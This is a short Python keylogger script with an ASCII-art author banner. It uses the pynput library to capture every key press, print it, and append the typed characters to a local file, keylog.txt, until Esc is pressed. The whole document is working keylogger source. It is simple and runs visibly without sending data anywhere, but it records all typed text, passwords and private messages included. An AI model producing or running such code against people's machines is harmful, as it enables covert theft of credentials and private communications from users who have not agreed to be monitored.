#  MADE BY:_            _   _____                        _
#  \ \    / (_)        (_) |  __ \                      (_)
#   \ \  / / _ _ __ ___ _  | |  | | __ _ ___  __ _ _ __  _
#    \ \/ / | | '__/ _ \ | | |  | |/ _` / __|/ _` | '_ \| |
#     \  /  | | | |  __/ | | |__| | (_| \__ \ (_| | | | | |
#      \/   |_|_|  \___| | |_____/ \__,_|___/\__,_|_| |_|_|
#                     _/ |
#                    |__/

# This is a key logging program that tracks every key hit
# and adds a ney line whenever space key is pressed

import pynput
from pynput.keyboard import Key, Listener

keys = []
count = 0


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(key)

    if count > 0:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("keylog.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')

            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()

